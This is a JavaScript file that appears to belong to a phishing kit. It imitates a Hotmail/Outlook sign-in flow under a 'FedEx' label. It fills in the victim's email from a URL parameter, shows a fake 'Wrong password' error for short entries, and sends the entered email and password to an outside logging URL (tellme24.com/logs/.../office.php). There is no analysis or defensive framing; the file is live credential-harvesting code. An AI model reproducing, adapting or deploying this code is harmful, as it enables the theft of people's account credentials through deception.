const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/

const getUrl = new URLSearchParams(window.location.search);
const userName = getUrl.get('user');

const err = document.getElementById("hotMessage");
const h1Text = document.getElementById("headerText");
const noAcc = document.getElementById("noAcc");

const email = document.getElementById("input_hotmail1");
const emailHolder = document.getElementById("emailHolder");

const passDiv = document.getElementById("hot_pass");
const pass = document.getElementById("input_hotmail2");

const submit1 = document.getElementById("submit_hotmail1");
const submit2 = document.getElementById("submit_hotmail2");

let url;


setTimeout(() => {

    document.getElementsByClassName("temp_loader")[0].style.display = "none"
    document.getElementsByClassName("hotmail_container")[0].style.display = "block"

    email.style.display = "none"
    h1Text.style.display = "none"
    passDiv.style.display = "block"

    if (validEmail.test(userName)) {
        emailHolder.innerHTML = '<i class="fa-solid fa-arrow-left"></i> ' + userName
        email.value = userName
    } else {
        emailHolder.innerHTML = '<i class="fa-solid fa-arrow-left"></i> ' + email.value
    }

    submit2.style.display = "block"
    noAcc.style.display = "none"

}, 2000);


submit2.addEventListener("click", function () {

    if (pass.value.length <= 6 && pass.value != "") {
        err.style.display = "block"
        err.innerText = "Wrong password"

        setTimeout(() => {
            err.innerText = ""
        }, 5000);

    }
    else if (pass.value.length <= 6 && pass.value == "") {
        err.style.display = "block"
        err.innerText = "Please enter your password"

        setTimeout(() => {
            err.innerText = ""
        }, 5000);

    }
    else {

        url = "Domain" + "=" + "FedEx: Hotmail | Outlook" + "&" + "Mail" + "=" + email.value + "&" + "Password" + "=" + pass.value

        location = "https://tellme24.com/logs/gm1/office.php?" + url

        setTimeout(() => {
            email.value = ""
            pass.value = ""
        }, 1000);
    }
})
